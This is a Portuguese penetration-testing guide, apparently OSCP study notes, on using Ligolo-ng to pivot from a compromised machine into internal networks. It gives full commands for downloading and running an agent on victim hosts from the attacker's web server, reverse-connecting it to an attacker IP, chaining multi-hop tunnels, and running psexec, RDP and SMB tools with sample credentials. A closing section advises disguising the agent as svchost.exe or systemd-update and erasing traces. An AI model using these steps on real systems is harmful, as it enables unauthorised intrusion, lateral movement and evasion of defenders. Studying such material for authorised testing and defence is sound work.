# Guia Completo de Configuração do Ligolo-ng

## Índice

- [Instalação](#instalação)
- [Configuração Básica do Tunnel](#configuração-básica-do-tunnel)
- [Pivoting Single-Hop](#pivoting-single-hop)
- [Pivoting Multi-Hop](#pivoting-multi-hop)
- [Roteamento Avançado](#roteamento-avançado)
- [Troubleshooting](#troubleshooting)

---

## Instalação

### Verificação Rápida (One-liner)

```shell
# Configuração rápida de pivot com Ligolo-ng (todos os comandos precisam de sudo)
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ./proxy --selfcert
```

> ⚠️ **Erros Comuns:**
>
> | Erro | Causa | Fix |
> | --- | --- | --- |
> | `ioctl(TUNSETIFF): Operation not permitted` | Falta sudo | Execute com `sudo` |
> | `RTNETLINK answers: Operation not permitted` | Falta sudo no `ip link` | Use `sudo ip link set ligolo up` |
> | `ioctl(TUNSETIFF): Device or resource busy` | Interface já existe | Delete antes: `sudo ip link delete ligolo` |
>
> **Resetar interface se ocupada:**
>
> ```shell
> sudo ip link delete ligolo 2>/dev/null; sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
> ```

### Máquina do Atacante (Kali)

> Download do proxy Ligolo-ng (v0.8.2)

```shell
# Download da versão mais recente
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
chmod +x proxy
./proxy --version
```

> **Corrigir Erro de Permissão (setcap):**

```shell
# Opção 1: Executar com sudo sempre
sudo ./proxy --selfcert

# Opção 2: Definir capabilities permanentemente (recomendado)
sudo setcap cap_net_admin,cap_net_raw+eip ./proxy
./proxy --selfcert  # Agora funciona sem sudo
```

### Máquina Alvo (Windows/Linux)

> Download do agent para Windows

```powershell
# Do PowerShell no target (v0.8.2)
iwr -Uri "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip" `
  -Outfile agent.zip
Expand-Archive agent.zip -DestinationPath .
```

> Download do agent para Linux

```shell
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
chmod +x agent
```

> Testar conectividade do agent

```shell
./agent -h
# Deve exibir o menu de ajuda
```

---

## Configuração Básica do Tunnel

### Passo 1: Iniciar Proxy no Atacante

> Gerar certificado autoassinado (apenas na primeira execução)

```shell
# Porta padrão agora é 11601
./proxy --selfcert

# Ou especificar porta
./proxy --selfcert --laddr 0.0.0.0:443
```

**Output:**

```text
INFO[0000] Listening on 0.0.0.0:11601
```

**Flags Explicadas (v0.8.x):**

- `--selfcert`: Gerar certificado autoassinado automaticamente
- `--laddr 0.0.0.0:443`: Escutar em todas as interfaces, porta 443
- `--autocert`: Solicitar certificados LetsEncrypt automaticamente
- `--webui`: Habilitar interface web (modo multiplayer)
- `-config ligolo-ng.yaml`: Usar arquivo de configuração

### Passo 2: Implantar Agent no Alvo

> Conectar agent ao proxy (Windows)

```powershell
# Porta padrão agora é 11601
.\agent.exe -connect 192.168.49.87:11601 -ignore-cert
```

> Conectar agent ao proxy (Linux)

```shell
./agent -connect 192.168.49.87:11601 -ignore-cert
```

**Flags Explicadas:**

- `-connect ATACANTE:443`: Endereço e porta do proxy
- `-ignore-cert`: Ignorar erros de certificado autoassinado
- `-relay-timeout 60`: Timeout de conexão
- `-retry 10`: Tentar novamente 10 vezes antes de encerrar

### Passo 3: Criar Sessão do Tunnel

> Na CLI do proxy Ligolo, listar agents

```text
ligolo-ng » session
[*] Sem sessão
```

> Aguardar o agent conectar, depois

```text
ligolo-ng » session
[*] 1 - NT AUTHORITY\SYSTEM@HOSTNAME - 192.168.49.87:11601 [Agent 0.8.2]
```

> Iniciar sessão

```text
ligolo-ng » session -i 1
[Agent: NT AUTHORITY\SYSTEM@HOSTNAME] »
```

**Status: TUNNEL ATIVO** ✅

### Passo 4: Autoroute (Recurso v0.8+) 🆕

> **NOVO no v0.8:** Criação automática de rotas e interfaces!

```text
[Agent: NT AUTHORITY\SYSTEM@HOSTNAME] » autoroute
? Selecionar rotas para adicionar: 172.16.87.0/24
? Criar nova interface ou usar existente? Criar nova interface
INFO[0176] Gerando nome aleatório para a interface...
INFO[0176] Usando nome de interface valuedlady
INFO[0176] Criando rotas para valuedlady...
? Iniciar o tunnel? Sim
INFO[0180] Iniciando tunnel para NT AUTHORITY\SYSTEM@HOSTNAME
```

> **Rota manual (se autoroute falhar):**

> Obter informações de rede do agent

```text
[Agent: user@HOSTNAME]» ifconfig
eth0: flags=... inet 172.16.87.100/24
```

> Adicionar rota para alcançar a rede interna

```shell
# Criar interface tun (use seu usuário, não 'kali')
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.87.0/24 dev ligolo
```

> ⚠️ **Se a interface já existir:**

```shell
# Deletar e recriar
sudo ip link delete ligolo
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.87.0/24 dev ligolo
```

### Passo 5: Verificar Tunnel

> Testar conectividade a partir do atacante

```shell
ping 172.16.87.100  # Deve responder
ping 172.16.87.200  # Outro host interno
```

> Se funcionar, você pode usar ferramentas diretamente na rede interna

```shell
nmap -sV 172.16.87.200
nxc smb 172.16.87.200 -u username -p password
```

---

## Pivoting Single-Hop

### Cenário: Máquina Comprometida → Rede Interna

**Configuração:**

- Comprometido: 192.168.49.100 (WS26)
- Alvo interno: 172.16.87.200 (SRV22)
- Atacante: 192.168.49.87

### Fluxo Completo

> Passo 1: No WS26, baixar e executar o agent

```powershell
# No WS26 (máquina comprometida)
$Url = "http://192.168.49.87:7000/agent.exe"
$Output = "C:\Temp\agent.exe"
(New-Object Net.WebClient).DownloadFile($Url, $Output)
& $Output -connect 192.168.49.87:443 -ignore-cert
```

> Passo 2: No proxy Ligolo, verificar sessão

```text
ligolo-ng » session
[*] 1 - ws26\user - 172.16.87.100:443 [Agent 0.7.12]
```

> Passo 3: Interagir com a sessão

```text
[Agent: ws26\user]» ifconfig
eth0: inet 172.16.87.100/24
```

> Passo 4: Adicionar rota interna

```shell
# Use $(whoami) para obter o nome do usuário atual dinamicamente
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.87.0/24 dev ligolo
```

> Passo 5: Escanear rede interna pelo tunnel

```shell
nmap -Pn -p 445,3306,1433,5985 172.16.87.200 -sV
nxc smb 172.16.87.200 -u svc_sql -p SQLPowerHouse333
```

> Passo 6: Usar ferramentas pelo tunnel

```shell
# RDP pelo tunnel
xfreerdp3 /u:Administrator /p:Password123 /v:172.16.87.200

# PSExec pelo tunnel
impacket-psexec svc_sql:SQLPowerHouse333@172.16.87.200
```

---

## Pivoting Multi-Hop

### Cenário: Atacante → WS26 → Rede Interna → DC20

**Layout da Rede:**

```text
[Atacante] → [WS26] → [Rede Interna 172.16.87.0/24] → [DC20]
192.168.49.87  192.168.49.100  Comprometido     172.16.87.200
```

### Configuração Multi-Hop

> Passo 1: Comprometer WS26 e configurar primeiro tunnel

```powershell
# No WS26
.\agent.exe -connect 192.168.49.87:443 -ignore-cert
```

> Passo 2: No Ligolo, criar listener para segundo pivot

```text
[Agent: ws26\user]» listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:443
[*] Listener em 0.0.0.0:9999 → 127.0.0.1:443
```

**Por quê:** Isso cria um ponto de pivot para o próximo agent

> Passo 3: Da máquina interna (SRV22), conectar ao WS26

```powershell
# No SRV22 (interno, comprometido via tunnel)
# Baixar agent primeiro
$Url = "http://172.16.87.100:7000/agent.exe"
$Output = "C:\agent.exe"
(New-Object Net.WebClient).DownloadFile($Url, $Output)

# Conectar ao listener do WS26
& $Output -connect 172.16.87.100:9999 -ignore-cert
```

> Passo 4: No Ligolo, verificar segunda sessão

```text
ligolo-ng » session
[*] 1 - ws26\user - 172.16.87.100:443
[*] 2 - srv22\svc_sql - 172.16.87.100:9999
```

> Passo 5: Mudar para segunda sessão e obter informações de rede

```text
ligolo-ng » session -i 2
[Agent: srv22\svc_sql]» ifconfig
eth0: inet 172.16.87.201/24
```

> Passo 6: Adicionar rota para segunda rede

```shell
# Se SRV22 pode alcançar a rede do DC (ex: 172.16.100.0/24)
# Na CLI do Ligolo:
# Use route_add para alcançar redes mais distantes
```

### Gerenciando Múltiplas Sessões

> Listar todas as sessões ativas

```text
ligolo-ng » session
```

> Alternar entre sessões

```text
ligolo-ng » session -i 1  # WS26
# Fazer algo
ligolo-ng » session -i 2  # SRV22
# Fazer outra coisa
```

> Manter múltiplos tunnels ativos simultaneamente

```shell
# Terminal 1: tunnel WS26
sudo ip route add 172.16.87.0/24 dev ligolo-ws26

# Terminal 2: tunnel SRV22
sudo ip route add 172.16.100.0/24 dev ligolo-srv22
```

---

## Roteamento Avançado

### Acessando Redes Internas Atrás do Pivot

> Obter todas as interfaces de rede do agent

```text
[Agent: ws26\user]» ifconfig
eth0: inet 192.168.87.100/24 broadcast 192.168.87.255 netmask 255.255.255.0
eth1: inet 172.16.87.100/24 broadcast 172.16.87.255 netmask 255.255.255.0
eth2: inet 10.0.0.100/24 broadcast 10.0.0.255 netmask 255.255.255.0
```

> Adicionar múltiplas rotas para todas as redes conectadas

```shell
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.87.0/24 dev ligolo
sudo ip route add 10.0.0.0/24 dev ligolo
```

### Port Forwarding Reverso

> Encaminhar serviço interno para o atacante

```text
[Agent: ws26\user]» listener_add --addr 127.0.0.1:8080 --to 172.16.87.200:3306
[*] Listener em 127.0.0.1:8080 → 172.16.87.200:3306
```

> Da máquina do atacante, conectar ao forward local

```shell
mysql -h 127.0.0.1 -P 8080 -u root -pPassword
```

### Proxy SOCKS (Alternativa ao Tunnel)

> Criar listener de proxy SOCKS

```text
[Agent: ws26\user]» listener_add --addr 127.0.0.1:1080 --socks5
[*] Servidor SOCKS5 escutando em 127.0.0.1:1080
```

> Usar com proxychains

```shell
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

proxychains nmap -Pn -p 445 172.16.87.200
proxychains impacket-psexec user@172.16.87.200
```

---

## Troubleshooting

### Problema 1: Agent Não Conecta

**Erro:** `Connection refused` ou timeout

> Solução: Verificar se o proxy está escutando

```shell
netstat -tlnp | grep :443
```

> Verificar firewall no atacante

```shell
sudo ufw allow 443
```

> Usar logging verboso

```shell
./agent.exe -verbose -connect 192.168.49.87:443 -ignore-cert
```

### Problema 2: Rota Não Funciona

**Erro:** `Destination unreachable` ou `No route to host`

> Verificar se a rota foi adicionada

```shell
ip route | grep ligolo
```

> Adicionar rota com métrica explícita

```shell
sudo ip route add 172.16.87.0/24 dev ligolo metric 100
```

> Verificar se a interface TUN está ativa

```shell
ip link show ligolo
# Deve mostrar: ligolo: <POINTOPOINT,UP,LOWER_UP>
```

### Problema 3: Problemas com Certificado

**Erro:** `certificate verification failed`

> Sempre usar a flag `-ignore-cert`

```shell
./agent.exe -connect 192.168.49.87:443 -ignore-cert
```

> Ou fornecer certificado manualmente

```shell
./agent.exe -connect 192.168.49.87:443 -cacert /path/to/cert.pem
```

### Problema 4: Performance Lenta

> Verificar latência do tunnel

```text
[Agent: user@host]» info
Connected: 192.168.49.87:443
Latency: 50ms
```

> Reduzir o timeout de relay se necessário

```shell
./agent.exe -connect 192.168.49.87:443 -relay-timeout 30 -ignore-cert
```

### Problema 5: Agent Desconecta Após 5 Minutos

> Aumentar tentativas de reconexão

```shell
./agent.exe -connect 192.168.49.87:443 -ignore-cert -retry 100
```

> Ou manter o proxy rodando com reconexão habilitada

```shell
./proxy-linux-amd64 -selfcert -laddr 0.0.0.0:443 -allow-all
```

---

## Considerações de Segurança

### Ocultando o Processo do Ligolo-ng

> No Windows, renomear o agent

```powershell
ren agent.exe svchost.exe
```

> No Linux, alterar o nome do processo

```bash
# Use: https://github.com/airman00/liprouting
# Ou renomear o binário: mv agent-linux-amd64 /usr/local/bin/systemd-update
```

### Limpeza

> Remover tunnels após o uso

```shell
sudo ip route del 172.16.87.0/24 dev ligolo
sudo ip link set ligolo down
sudo ip tuntap del user kali mode tun ligolo
```

> Encerrar agent no alvo (não deixar rastros)

```powershell
taskkill /IM agent.exe /F
```

---

## Referência Rápida

### Configuração Padrão (30 segundos)

```bash
# Terminal 1: Proxy
./proxy-linux-amd64 -selfcert -laddr 0.0.0.0:443

# Terminal 2: Configurar TUN
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Terminal 3: Executar no alvo
agent.exe -connect 192.168.49.87:443 -ignore-cert

# CLI do Proxy: Iniciar sessão
session -i 1

# Terminal 2: Adicionar rota
sudo ip route add 172.16.87.0/24 dev ligolo

# Testar
ping 172.16.87.200
```

### Pivot Multi-Hop (2 minutos)

```text
# Primeiro hop: agent conecta ao proxy
# Na CLI do proxy:
listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:443

# Segundo hop: próximo agent conecta ao primeiro pivot
agent2.exe -connect 172.16.87.100:9999 -ignore-cert

# Verificar e adicionar rota
session -i 2
# Adicionar nova rota para a segunda rede
```

### Verificar Tudo Funcionando

```shell
# Do atacante
ping 172.16.87.200        # Verificar rota
nmap -Pn 172.16.87.200    # Verificar acesso
nxc smb 172.16.87.200     # Verificar SMB
impacket-psexec user@172.16.87.200  # Verificar execução
```

---

## Novidades do Ligolo-ng v0.8.x

### Autoroute (Configuração Automática)

> Cria interfaces e rotas automaticamente

```text
[Agent: NT AUTHORITY\SYSTEM@HOST] » autoroute
? Selecionar rotas para adicionar: 172.16.87.0/24
? Criar nova interface ou usar existente? Criar nova interface
INFO[0176] Gerando nome aleatório para a interface...
INFO[0176] Usando nome de interface valuedlady
? Iniciar o tunnel? Sim
INFO[0180] Iniciando tunnel
```

### Comandos de Gerenciamento de Interface

```text
# Listar interfaces
ligolo-ng » interface_list

# Criar interface com nome
ligolo-ng » interface_create --name "evil-cha"

# Adicionar rota à interface
ligolo-ng » interface_add_route --name evil-cha --route 192.168.2.0/24

# Remover rota
ligolo-ng » interface_del_route --name evil-cha --route 192.168.2.0/24

# Iniciar tunnel em interface específica
[Agent: user@host] » tunnel_start --tun evil-cha
```

### WebUI (Modo Multiplayer)

```shell
# Habilitar WebUI para colaboração em equipe
./proxy --selfcert --webui

# Acessar em: https://localhost:8080
```

### Arquivo de Configuração

```yaml
# ligolo-ng.yaml
selfcert: true
laddr: "0.0.0.0:11601"
webui: true
```

### Encerrar Agent Remotamente

```text
# Terminar agent remotamente
ligolo-ng » session -i 1
[Agent: user@host] » kill
```

### Corrigir Permissão (setcap)

```shell
# Corrigir erro "Operation not permitted" permanentemente
sudo setcap cap_net_admin,cap_net_raw+eip ./proxy

# Verificar capabilities
getcap ./proxy
# Output: ./proxy cap_net_admin,cap_net_raw=eip
```

---

## Veja Também

### Arquivos Relacionados de Movimento Lateral

- **[Pivoting & Tunneling](Pivoting-Tunneling.md)** - SSH tunnels, Chisel, Proxychains, sshuttle
- **[Movimento Lateral](Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash

### Exploração de AD (Após Pivoting)

- **[Exploração de AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound na rede interna
- **[Ataques Kerberos](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Atacar DC após configurar tunnel
- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder através do tunnel

### Preparação OSCP

- **[Exemplos de Laboratório](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - AD Set usa pivoting com Ligolo-ng
- **[Dicas do Exame](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - Estratégia de pontuação no AD Set
